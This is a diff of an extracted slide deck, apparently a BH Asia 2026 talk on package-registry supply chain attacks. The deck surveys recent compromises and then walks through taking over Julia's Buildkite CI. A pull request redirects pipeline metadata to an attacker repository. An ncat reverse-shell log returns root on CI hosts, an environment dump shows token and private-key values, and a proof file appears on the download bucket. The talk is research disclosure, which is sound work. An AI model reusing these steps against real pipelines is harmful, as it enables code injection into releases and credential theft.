@@ -14,6 +14,9 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 86.8
 ocr_unreliable_blocks: 2
+vision_unreviewed_pages: 72
+vision_verified_pages_changed: 76
+vision_verified_pages: 102
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 3
 companion_files: []
@@ -61,110 +64,142 @@ before the very first pip install?
 
 ## Slide 8
 
-$ whois **splitline** .tw Security Researcher @ DE✓CORE. Member of UNDEFINED Conclave. . Average Web Hacking Enjoyer Ng Tsi-Lin
+$ whois **splitline**.tw
+
+Security Researcher @ DE✓CORE
+
+Member of UNDEFINED Conclave
+
+Average Web Hacking Enjoyer
+
+Ng Tsi-Lin
 
 ## Slide 9
 
+Supply Chain Attack
+
 ## Slide 10
 
-
-> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-we) axios / axios ~
-Code ©) Issues 47
-7) Pullrequests 19 G Agents ) Discussions ©) Actions © Security and quality 39 l~ Insights
+axios / axios
+
+Code   Issues 47   Pull requests 19   Agents   Discussions   Actions   Security and quality 39   Insights
+
 axios@1.14.1 and axios@0.30.4 are compromised #10604
-g ashishkurmi opened on Mar 30
-Last edited by ashishkurmi ~ °**
-more details: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-troj
+Closed
+
+ashishkurmi opened on Mar 30                    Last edited by ashishkurmi
+
+more details: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
+
 Most likely, a maintainer's GitHub and npm accounts are compromised as these issues are getting deleted.
-| have also reported this as a vulnerability, so that a CVE can be generated.
-2110 @ 55 #51 ** 180
+
+I have also reported this as a vulnerability, so that a CVE can be generated.
+
+👍 702   😄 9   😕 110   ❤️ 55   🚀 51   👀 180
 ```
 
 ## Slide 11
 
-
-> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-we) axios / axios ~ Q Type (/) to search
-<> Code ©) Issues 47 3 Pull
-RESEARCH
-axios@1.14 Mini Shai-Hulud Hits @antv Ecosystem,
-639 Compromised npm Package Versions
-g ashishkurmi ope Active npm supply chain attack compromises @antv packages
-in a fast-moving malicious publish wave tied to Mini Shai-Hulud.
-more details: https:/)
-| Socket Research Team
+axios / axios
+
+Code   Issues 47   Pull
+
+axios@1.14
+
+Closed
+
+ashishkurmi ope
+
+more details: https://
+
 Most likely, a mainta
-| have also reported
-May 19,2026 / 5minread X 8 AA
-» echarts-for-react 0% (200) 100) (ico)
-latest Source [Jnpm Copy purl @ Security
+
+I have also reported
+
+👍 702   😄 9   😕
+
+RESEARCH
+
+Mini Shai-Hulud Hits @antv Ecosystem, 639 Compromised npm Package Versions
+
+Active npm supply chain attack compromises @antv packages in a fast-moving malicious publish wave tied to Mini Shai-Hulud.
+
+Socket Research Team
+
+May 19, 2026 / 5 min read
+
+echarts-for-react
+Apache Echarts components for React.
+latest   Source   npm   Copy purl   Socket 0
+
+0% Supply Chain Security   100 Vulnerability   100 Quality   82 Maintenance   100 License
 ```
 
 ## Slide 12
 
-
-> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
 TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
-npm, PyPI, and CrateslO
-& RavieLakshmanan @ May 25, 2026 Supply Chain Attack / Malware
-Top Stories This Week
-New Bit2Watt Attack Could Let Cloud
-Tenants Disrupt Power Grids Without an
-Exploit
-Open-Source Android Al Agents Could Let
-Invisible Screen Text Run Code on Host
-PCs
-Hacker Runs Hermes Al Agent
-Unattended for Post-Exploitation at Thai
-Finance Ministry
-Critical SharePoint RCE CVE-2026-50522
-Under Active Exploitation After Public
-PoC
-Microsoft Azure DevOps MCP Flaw Lets
-Hidden PR Comments Hijack Al Review
-Agents
-A new coordinated cross-ecosystem software supply chain attack campaign has targeted npm, PyPI, Researcher Publishes GitLab RCE PoC
-and Crates.io to distribute credential-stealing malware. Letting Authenticated Users Run
-Commands as Git
-Agobe Acrobat Extension Flaw Let
+npm, PyPI, and CratesIO
+
+Ravie Lakshmanan   May 25, 2026                                    Supply Chain Attack / Malware
+
+⚡ Top Stories This Week
+
+New Bit2Watt Attack Could Let Cloud Tenants Disrupt Power Grids Without an Exploit
+
+Open-Source Android AI Agents Could Let Invisible Screen Text Run Code on Host PCs
+
+Hacker Runs Hermes AI Agent Unattended for Post-Exploitation at Thai Finance Ministry
+
+Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC
+
+Microsoft Azure DevOps MCP Flaw Lets Hidden PR Comments Hijack AI Review Agents
+
+Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git
+
+Adobe Acrobat Extension Flaw Let
+
+A new coordinated cross-ecosystem software supply chain attack campaign has targeted npm, PyPI, and Crates.io to distribute credential-stealing malware.
+
 The campaign, codenamed TrapDoor, spans more than 34 malicious packages across over 384
-0%
+
+👍 702   😄 9   😕
+
+echarts-for-react
 Apache Echarts components for React.
-Supply Chain Vulnerability Quality Maintenance
-License
-to search
+latest   Source   npm   Copy purl   Socket 0
+
+0% Supply Chain Security   100 Vulnerability   100 Quality   82 Maintenance   100 License
 ```
 
 ## Slide 13
 
-
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
 TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
-npm, PyPI, and CrateslO
-& RavieLakshmanan @ May 25, 2026 Supply Chain Attack / Malware
-+(7) to search
-=O
-Top Stories This Week
-[4 RHSB-2026-006 Supply chain compromise of @redhat-cloud-services npm packages
-7 Created Date: June 1, 2026 at 03:50 PM
+npm, PyPI, and CratesIO
+
+Ravie Lakshmanan   May 25, 2026                              Supply Chain Attack / Malware
+
+⚡ Top Stories This Week
+
+RHSB-2026-006 Supply chain compromise of @redhat-cloud-services npm packages
+
+Created Date: June 1, 2026 at 03:50 PM
 Updated July 2, 2026 at 08:38 AM
-\ Resolved
+
+Resolved
 Status
-PAGE NAVIGATION Executive Summary
-We have completed our investigation into the compromise that we disclosed on June 1, 2026. Our findings
-Executive Summary identified that on May 29, 2026, a GitHub account, compromised via a VS code extension containing
-; malware, was used to inject malicious code into packages maintained in a Red Hat GitHub organization
-Technical Summary and altered configuration files to infect other developers opening those directories. The compromised VS
-code extension was contained on June 1, 2026.
+
+PAGE NAVIGATION
+
+Executive Summary
+Technical Summary
+
+Executive Summary
+
+We have completed our investigation into the compromise that we disclosed on June 1, 2026. Our findings identified that on May 29, 2026, a GitHub account, compromised via a VS code extension containing malware, was used to inject malicious code into packages maintained in a Red Hat GitHub organization and altered configuration files to infect other developers opening those directories. The compromised VS code extension was contained on June 1, 2026.
 ```
 
 ## Slide 14
@@ -209,13 +244,45 @@ pgx flask Plots.jl firebase_core
 
 ## Slide 18
 
-Flutter proxy.golang.org PyPi JuliaHub pub.dev http requests Flux.jl gorm numpy DataFrames.jl flutter_svg gin pgx flask Plots.jl firebase_core Hack the Source of the Source / BH Asia 2026
+Package Developer
+Upload
+Package Registry
+PyPI, npm, RubyGems, Nuget...
+Compromise
+requests
+Newtonsoft.Json
+express.js
+Poision
+RIP
+
+Flutter
+proxy.golang.org PyPi JuliaHub pub.dev
+http
+requests Flux.jl
+gorm numpy DataFrames.jl flutter_svg
+gin
+pgx flask Plots.jl firebase_core
+
+Hack the Source of the Source / BH Asia 2026
 
 ## Slide 19
 
-Flutter
+Package Registry
+Upload
+What's Behind
+All of These?
+Poision
+RIP
 
-> proxy.golang.org PyPi JuliaHub pub.dev http requests Flux.jl gorm numpy DataFrames.jl flutter_svg gin pgx flask Plots.jl firebase_core Hack the Source of the Source / BH Asia 2026
+Flutter
+proxy.golang.org PyPi JuliaHub pub.dev
+http
+requests Flux.jl
+gorm numpy DataFrames.jl flutter_svg
+gin
+pgx flask Plots.jl firebase_core
+
+Hack the Source of the Source / BH Asia 2026
 
 ## Slide 20
 
@@ -251,15 +318,13 @@ pgx flask Plots.jl firebase_core
 
 Flutter
 proxy.golang.org PyPi JuliaHub pub.dev
-①
-③
-②
-④
+④ ③ ① ②
 http
 requests Flux.jl
 gorm numpy DataFrames.jl flutter_svg
 gin
-pgx Agenda�flask :) Plots.jl firebase_core
+pgx flask Plots.jl firebase_core
+Agenda :)
 
 ## Slide 24
 
@@ -274,6 +339,10 @@ pgx flask Plots.jl firebase_core
 
 ## Slide 25
 
+Born Corrupted How We Backdoored ~~Trusted Language Binaries~~
+
+Tsi-Lin (splitline) Ng
+
 Flutter
 proxy.golang.org PyPi JuliaHub pub.dev
 How?
@@ -285,6 +354,12 @@ pgx flask Plots.jl firebase_core
 
 ## Slide 26
 
+Born Corrupted How We Backdoored
+
+whatever software or package or stuffs
+
+Tsi-Lin (splitline) Ng
+
 Flutter
 proxy.golang.org PyPi JuliaHub pub.dev
 How?
@@ -293,53 +368,90 @@ requests Flux.jl
 gorm numpy DataFrames.jl flutter_svg
 gin
 pgx flask Plots.jl firebase_core
-whatever software or package or stuffs
 
 ## Slide 27
 
-CI/CD� Developer� Developers ??? Risks Dashboard Themself Attack Surfaces
+CI/CD Risks
+
+Developer Dashboard
+
+Developers Themself
+
+???
+
+Attack Surfaces
 
 ## Slide 28
 
-CI/CD� Developer� ~~Developers~~ ??? Risks Dashboard ~~Themself~~
+CI/CD Risks
+
+Developer Dashboard
+
+~~Developers Themself~~
+
+???
 
 Attack Surfaces
 
 ## Slide 29
 
-Developer�
-CI/CD�Risks ???
-Dashboard
+CI/CD Risks
+
+Developer Dashboard
+
+???
+
 Attack Surfaces
 
 ## Slide 30
 
-Developer� CI/CD�Risks ??? Dashboard Attack Surfaces
+CI/CD Risks
+
+Web Hacking
+
+Developer Dashboard
+
+???
+
+Attack Surfaces
 
 ## Slide 31
 
-CI/CDRisks
-Developer
-Dashboard
-???
-Attack Surfaces
-Web Hacking
-Access Control
 Insuff. Flow Control
+
+CI/CD Risks
+
+Access Control
+
 Poisoned Pipeline
+
+Web Hacking
+
+Developer Dashboard
+
+???
+
+Attack Surfaces
 
 ## Slide 32
 
-CI/CDRisks
-Developer
-Dashboard
-???
-Attack Surfaces
-Web Hacking
-Access Control
 Insuff. Flow Control
+
+CI/CD Risks
+
+Access Control
+
 Poisoned Pipeline
+
+Web Hacking
+
+Developer Dashboard
+
+???
+
 Let's Think!
+
+Attack Surfaces
 
 ## Slide 33
 
@@ -347,47 +459,64 @@ julia 1
 
 ## Slide 34
 
-
-> Recovered by OCR — confidence 83/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-Code Issues 3.7k Pull requests 977 Agents Discussions Actions More v
-Filters » Q is:pris:open © Labels 181 [> Milestones 5 New pull request
-Author ~ Label ~ Projects ~ Milestones ~ Reviews ~,
+JuliaLang / julia
+
+Code   Issues 3.7k   Pull requests 977   Agents   Discussions   Actions   More
+
+Filters   is:pr is:open   Labels 181   Milestones 5   New pull request
+
+976 Open   33,525 Closed
+
+Author   Label   Projects   Milestones   Reviews   Assignee
+
+Open a Pull Request
 ```
 
 ## Slide 35
 
 Takeover What You Download!
 
-
-> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-ju | la Download Docs Learn Blog Community
-Code ls
+julia
+Download   Docs   Learn   Blog   Community
+
+Current Stable Rele
+
 v1.12.6 (April 9, 2026)
-Filters +
-Release notes | GitHub tag |
-Platform
-Auth¢ Windows [help]
-macOS (Apple Silicon) [help]
-_macOS (Intel x86) [help]
+Release notes | GitHub tag | SHA256 Checksums
+
+Platform                       -bit
+Windows [help]                 aller, portable
+macOS (Apple Silicon) [help]   .dmg, .tar.gz
+macOS (Intel x86) [help]       .dmg, .tar.gz
+
 https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.dmg
+
+976 Op
+Autho
 ```
 
 ## Slide 36
 
-
-> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-ju | la Download Docs Learn Blog Community
-Code Is
+Code  Is
+
+julia
+Download   Docs   Learn   Blog   Community
+
+Current Stable Rele
+
 v1.12.6 (April 9, 2026)
-Release notes | GitHub tag | Sag
-Filters +
-macOS (Intel x86) [help]
+Release notes | GitHub tag | SHA256 Checksums
+
+Takeover What You Download!
+
+macOS (Apple Silicon) [help]   .dmg, .tar.gz
+macOS (Intel x86) [help]       .dmg, .tar.gz
+
+https://julialang-s3.julialang.org/bin/mac/aarch6
+
 https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.dmg
 ```
 
@@ -402,7 +531,7 @@ Job#2
 Job#3
 …
 
-#### Job�Worker
+#### Job Worker
 
 ## Slide 39
 
@@ -411,29 +540,77 @@ Job#2
 Job#3
 …
 
-#### Job�Worker
+#### Job Worker
 
 ## Slide 40
 
-/secrets/agent.key
 Job#1
 Job#2
 Job#3
 …
 
-#### Job�Worker
+/secrets/agent.key
+
+#### Job Worker
 
 ## Slide 41
 
-/secrets/agent.key Job#1 Job#2 Job#3 Privileged Normal … env[KEY]=SECRET (unmount) ///�RUN�PIPELINE�/// Job�Worker
+Job#1
+Job#2
+Job#3
+…
+
+/secrets/agent.key
+
+Privileged   Normal
+
+env[KEY]=SECRET   (unmount)
+
+/// RUN PIPELINE ///
+
+Job Worker
 
 ## Slide 42
 
-/secrets/agent.key Job#1 ② Cross Job <u>① Compromise</u> Job#2 Job#3 Privileged Normal … env[KEY]=SECRET (unmount) ///�RUN�PIPELINE�/// Job�Worker
+Job#1
+Job#2
+Job#3
+…
+
+/secrets/agent.key
+
+① Compromise
+
+② Cross Job
+
+Privileged   Normal
+
+env[KEY]=SECRET   (unmount)
+
+/// RUN PIPELINE ///
+
+Job Worker
 
 ## Slide 43
 
-/secrets/agent.key Job#1 ② Cross Job <u>① Compromise</u> Job#2 Job#3 Privileged Normal … env[KEY]=SECRET (unmount) ///�RUN�PIPELINE�/// Job�Worker
+Job#1
+Job#2
+Job#3
+…
+
+/secrets/agent.key
+
+① Compromise
+
+② Cross Job
+
+Privileged   Normal
+
+env[KEY]=SECRET   (unmount)
+
+/// RUN PIPELINE ///
+
+Job Worker
 
 ## Slide 44
 
@@ -453,100 +630,270 @@ $ git clone <FORK>/julia $ make build build_x86_64-linux-gnu
 
 ## Slide 46
 
-0_webui.yml **meta-data** set REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() git clone $REPO_URL .buildkite/…/upload_julia.sh upload_x86_64-linux-gnu
-
 Pull Request
 
-$ git clone <FORK>/julia $ make build build_x86_64-linux-gnu
-
-## Slide 47
-
-0_webui.yml **meta-data** set Pull Request REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu
-
-Pull Request
-
-## Slide 48
-
-0_webui.yml **meta-data** set Pull Request REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build .buildkite/…/upload_julia.sh Arbitrary�Execution! build_x86_64-linux-gnu upload_x86_64-linux-gnu
-
-## Slide 49
-
-0_webui.yml **meta-data** set Pull Request REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone ATTACKER/julia git clone $REPO_URL $ make build .buildkite/…/upload_julia.sh @buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite" @buildkite-agentbuild_x86_64-linux-gnu meta-data set VERSION  "main" upload_x86_64-linux-gnu </> Makefile
-
-## Slide 50
-
-0_webui.yml **meta-data** set Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone ATTACKER/julia git clone $REPO_URL $ make build .buildkite/…/upload_julia.sh @buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite" @buildkite-agentbuild_x86_64-linux-gnu meta-data set VERSION  "main" upload_x86_64-linux-gnu </> Makefile
-
-## Slide 51
-
-0_webui.yml **meta-data** set Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone ATTACKER/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu
-
-## Slide 52
-
-0_webui.yml
-meta-data  set
-Pull Request REPO_URL=  JuliaCI/julia-buildkite
+0_webui.yml **meta-data** set
+REPO_URL= JuliaCI/julia-buildkite
 VERSION = <HEAD>
+
+$ git clone <FORK>/julia
+$ make build
+build_x86_64-linux-gnu
+
 launch_signed_jobs
 Privileged
 REPO_URL,VERSION = get_meta()
-$ git clone <FORK>/julia
 git clone $REPO_URL
-$ make build
-Depends On
 .buildkite/…/upload_julia.sh
-build_x86_64-linux-gnu  upload_x86_64-linux-gnu
+upload_x86_64-linux-gnu
+
+## Slide 47
+
+Pull Request
+
+0_webui.yml **meta-data** set
+REPO_URL= JuliaCI/julia-buildkite
+VERSION = <HEAD>
+
+$ git clone <FORK>/julia
+$ make build
+build_x86_64-linux-gnu
+
+Depends On
+
+launch_signed_jobs
+Privileged
+REPO_URL,VERSION = get_meta()
+git clone $REPO_URL
+.buildkite/…/upload_julia.sh
+upload_x86_64-linux-gnu
+
+## Slide 48
+
+Pull Request
+
+0_webui.yml **meta-data** set
+REPO_URL= JuliaCI/julia-buildkite
+VERSION = <HEAD>
+
+$ git clone <FORK>/julia
+$ make build
+
+Arbitrary Execution!
+
+build_x86_64-linux-gnu
+
+launch_signed_jobs
+Privileged
+REPO_URL,VERSION = get_meta()
+git clone $REPO_URL
+.buildkite/…/upload_julia.sh
+upload_x86_64-linux-gnu
+
+## Slide 49
+
+Pull Request
+
+0_webui.yml **meta-data** set
+REPO_URL= JuliaCI/julia-buildkite
+VERSION = <HEAD>
+
+$ git clone ATTACKER/julia
+$ make build
+
+@buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite"
+@buildkite-agent meta-data set VERSION "main"
+
+</> Makefile
+
+build_x86_64-linux-gnu
+
+launch_signed_jobs
+Privileged
+REPO_URL,VERSION = get_meta()
+git clone $REPO_URL
+.buildkite/…/upload_julia.sh
+upload_x86_64-linux-gnu
+
+## Slide 50
+
+Pull Request
+
+0_webui.yml **meta-data** set  ATTACKER/julia-buildkite
+REPO_URL= ~~JuliaCI/julia-buildkite~~
+VERSION = <HEAD>
+
+$ git clone ATTACKER/julia
+$ make build
+build_x86_64-linux-gnu
+
+launch_signed_jobs
+Privileged
+REPO_URL,VERSION = get_meta()
+git clone $REPO_URL
+.buildkite/…/upload_julia.sh
+upload_x86_64-linux-gnu
+
+## Slide 51
+
+Pull Request
+
+0_webui.yml **meta-data** set  **ATTACKER/julia-buildkite**
+REPO_URL= ~~JuliaCI/julia-buildkite~~
+VERSION = <HEAD>
+
+$ git clone <FORK>/julia
+$ make build
+build_x86_64-linux-gnu
+
+Depends On
+
+launch_signed_jobs
+Privileged
+REPO_URL,VERSION = get_meta()
+git clone $REPO_URL
+.buildkite/…/upload_julia.sh
+upload_x86_64-linux-gnu
+
+## Slide 52
+
+Pull Request
+
+0_webui.yml **meta-data** set  **ATTACKER/julia-buildkite**
+REPO_URL= ~~JuliaCI/julia-buildkite~~
+VERSION = <HEAD>
+
+$ git clone <FORK>/julia
+$ make build
+build_x86_64-linux-gnu
+
+Depends On
+
+launch_signed_jobs
+Privileged
+REPO_URL,VERSION = get_meta()
+git clone $REPO_URL
+.buildkite/…/upload_julia.sh
 Malicious!
-ATTACKER/julia-buildkite
+upload_x86_64-linux-gnu
 
 ## Slide 53
 
-|**meta-data**set
-REPO_URL=~~JuliaCI/julia-buildkite~~
-VERSION = <HEAD>
-0_webui.yml
-Pull Request
-**ATTACKER/julia-b**|**uildkite**|
-|---|---|
-|launch_signed_j|obs|
-||Privileged|
-|$ git clone <FORK>/julia
-REPO_URL,VERSION= g|et_meta()|
-|Depends On
+```text
+test: pre-build step for Buildkite metadata #62072
 
-$ make build
-git clone$REPO_URL|Malicious!|
-|
+Some checks haven't completed yet
+6 pending, 3 successful checks
 
-.buildkite/
-…
-/upload_|julia.sh|
-|build_x86_64-linux-gnu
-upload_x86_64-lin|ux-gnu|
+9 checks
+
+Build   Waiting for status to be reported — Started...
+buildkite/julia-master   Waiting for status to be reported — Build #57973 started
+Check   Waiting for status to be reported — Started...
+JuliaC   Waiting for status to be reported — Started...
+JuliaSyntax   Waiting for status to be reported — Started...
+Labels / Check for blocking labels (pull_request)   Successful in 4s
+Test   Waiting for status to be reported
+
+31  +     -@buildkite-agent meta-data set
+    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
+```
 
 ## Slide 54
 
-0_webui.yml **meta-data** set **ATTACKER/julia-buildkite** Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu
+```text
+test: pre-buil
+
+~ rlwrap ncat -klvp 7414
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::7414
+Ncat: Listening on 0.0.0.0:7414
+Ncat: Connection from 128.30.92.138.
+Ncat: Connection from 128.30.92.138:48800.
+# Ncat: Connection from 128.30.92.137.
+Ncat: Connection from 128.30.92.137:41112.
+id
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+env
+BUILDKITE_PULL_REQUEST_LABELS=
+BUILDKITE_CANCEL_GRACE_PERIOD=300
+BUILDKITE_GIT_FETCH_FLAGS=-v --prune --tags
+BUILDKITE_AGENT_META_DATA_CRYPTIC_CAPABLE=true
+BUILDKITE_BUILD_CHECKOUT_PATH=/cache/build/tester-amdci5-10/julialang/julia-master
+BUILDKITE_ADDITIONAL_HOOKS_PATHS=
+FORCE_SANDBOX_MODE=unprivileged
+
+Check for blocking labels (pull_request)   Successful in 4s
+Test   Waiting for status to be reported
+
+31  +     -@buildkite-agent meta-data set
+    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
+```
 
 ## Slide 55
 
-0_webui.yml **meta-data** set **ATTACKER/julia-buildkite** Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD>
+```text
+Linux amdci5.julia.csail.mit.edu
+Linux amdci4.julia.csail.mit.edu 5.15.0-184-generic #194-Ubuntu SMP Mon
 
-launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu
+env | grep -E '(SECRET|TOKEN)='
+BUILDKITE_PLUGIN_CRYPTIC_BASE64_SIGNED_JOB_ID_SECRET=Z6OaqbiPaa0RK/E5
+RG3cxUVTx1MJ3rPBZDVEGIEuAuFUz7dRHK7EFtUFf+E7crhCMPO9uDhKtWJDoIsNywPv+
+DJh8uXhXJWHwrr1Bkv7Ur6nYFAX8DuhJEzSvjY6NUgnvTNmRRR0BkQm9GmIpvOP0ERKZz
+BUILDKITE_AGENT_JOB_API_TOKEN=CO2E6q9DbzXsvW70GqGIxITo6ukkEEtY0mV5X2f
+F0WHNKMzFGbTFKN29IYzlveGZaWQpKY3FxRk5yaXRMUUhxaDVJUHNGS3YySis1K1FVQkZ
+BUILDKITE_PLUGIN_CRYPTIC_BASE64_AGENT_PUBLIC_KEY_SECRET=LS0tLS1CRUdJT
+QUVZWWNTZGdvTGt4YWpWNy9rb0hFTDgrczRKdFRVNUJ6d1RFdXAKTllTZGNQOFhQSmJLe
+VxMUZFb0N2MDRyaTFXaWpVZXorMytEWVM4UCtROGRxMGJYUWZUS1Vyc0thMkdnLzVmZ0h
+UW5QNDZVLzEKZFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+BUILDKITE_PLUGIN_CRYPTIC_BASE64_AGENT_PRIVATE_KEY_SECRET=LS0tLS1CRUdJ
+FlTOFArUThkcTBiWFFmVEtVcnNLYTJHZy81ZmdIeWdEdWRHT2ZsdzUvVEljR3VVbGNsd1
+0dOMkhtK3E5elBlSHAxd3pIZU5aZ29BR0htM3RyUU0KMGpidUczN09OSG1YdGQ1MEYyVH
+1eDVSMHNIdDFoU2FvTXBFbSsrMWc1V09rSzZDTGFJbEV0ZitWVVBvR0piYlNYRzNJCmo5
+0wKQSsvVFdCbUJBb0dCQU52cXRPQjRuVS9zODIxTU9alRPTmtFOGNJOENxV1BRTZXcE
+HFISy9SV2dVK3ZZaitwZy9ibXBwMmdiUXZkYTJxaS84UEl2OApSb0JwcmY2Y285TmdSaZ
+mxYMVZnWQpYUjAXcyUmpmS09TbElYZFlITjZwOUZBb0dCQUp0NXdwMkVPRXR5VE9NZnVn
+USVF4SHZBaE1rSDJvMVZaSGxCY25oMVEKdjV3QTbhRkVGVkNuczU4QVNEVjMwd2d0VlBx
+1I4RmxWNHc4OUF5R3NuVnNnUDJ1RWtxTEI1UTRUcTZnVDBLakVETE51CjRobEhvOGFsQW
+0Uisxd2xpWkQwZGJnRGdVeVRMcnN5Y1RDSkZIczNIZTFXb3NCSzcxTmlncFZhWEVzWnFp
+EdnPQotLS0tLUVORCBSU0EgUEJJVkFURSBLRVktLS0tLQo=
+BUILDKITE_AGENT_ACCESS_TOKEN=bkaj_eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwMT
+tODM3Yy01MjBjM2M4YmFiMDMiLCJpc3MiOiJidWlsZGtpdGUiLCJleHAiOiF...
+
+Test   Waiting for status to be reported
+
+31  +     -@buildkite-agent meta-data set
+    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
+```
 
 ## Slide 56
 
-0_webui.yml **meta-data** set **ATTACKER/julia-buildkite** Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD>
+```text
+test: pre-buil
 
-launch_signed_jobs
+~ rlwrap ncat -klvp 7414
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::7414
+Linux amdci5.julia.csail.mit.edu
+Linux amdci4.julia.csail.mit.edu 5.15.0-184-generic #194-Ubuntu SMP M
+env | grep -E '(SECRET|TOKEN)='
+BUILDKITE_PLUGIN_CRYPTIC_BASE64_SIGNED_JOB_ID_SECRET=Z6OaqbiPaa0RK/E5
 
-$ git clone <FORK>/julia $ make build
+← → ⟳   https://julialang-s3.julialang.org/bin/linux/x64/1.12/pwned.txt
 
-Privileged REPO_URL,VERSION = get_meta()
+pwned
 
-git clone $REPO_URL Depends On .buildkite/…/upload_julia.sh
+...0Uisxd2xpWkQwZGJnRGdVeVRMcnN5Y1RDSkZIczNIZTFXb3NCSzcxTmlncFZhWEVzWnFp
+EdnPQotLS0tLUVORCBSU0EgUEJJVkFURSBLRVktLS0tLQo=
+BUILDKITE_AGENT_ACCESS_TOKEN=bkaj_eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwMT
+tODM3Yy01MjBjM2M4YmFiMDMiLCJpc3MiOiJidWlsZGtpdGUiLCJleHAiOiF...
 
-build_x86_64-linux-gnu upload_x86_64-linux-gnu
+Test   Waiting for status to be reported
+
+31  +     -@buildkite-agent meta-data set
+    BUILDKITE_PLUGIN_EXTERNAL_BUILDKITE_VERSION  "main"
+```
 
 ## Slide 57
 
@@ -558,49 +905,56 @@ Flutter 2
 
 ## Slide 59
 
-
-> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-= ©) flutter / flutter ~
-Code Issues 5k+ Pull requests
-Filters » Q is:pris:open
-Author + Label + Projects +
-518
-Q 8
-Agents Actions
-© Labels 492
-Milestones ~
-Projects
-[> Milestones 9
-Reviews ~
-Assignee ~
-New pull request
-Sort ~
+flutter / flutter
+
+Code   Issues 5k+   Pull requests 518   Agents   Actions   Projects   Wi   More
+
+Filters   is:pr is:open   Labels 492   Milestones 9   New pull request
+
+518 Open   72,681 Closed
+
+Author   Label   Projects   Milestones   Reviews   Assignee   Sort
+
+From Opening a PR
 ```
 
 ## Slide 60
 
-
-> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
+flutter / flutter
+
+Code   Issues 5k+   Pull requests
+
+Filters   is:pr is:open
+
+518 Open   72,681 Closed
+
+Author   Label   Projects   Milestones   Assignee   Sort
+
 Install manually
-Install and set up Flutter
-To install the Flutter SDK, download the latest
 Install with VS Code
-SDK archive stored.
-= flutter / fl) | Upgrade SDK
-€) 1 Download the Flutter SDK bundle
+SDK archive
+Upgrade SDK
 Add to path
-Code Issues 5k+ Download the following installation bunc
 Troubleshoot
-Uninstall SDK flutter_windows_3.44.8-stable.zip
-Filters » Q is:pris
-(© Resources v
-2 Create gz r to store the SDK
-https://storage.googleapis.com/flutter_infra_release/releases/stable/windq windows_3.44.8-stable.zip ,
-Author + Label + Projects ~ Milestong
+Uninstall SDK
+Resources
+
+Install and set up Flutter
+
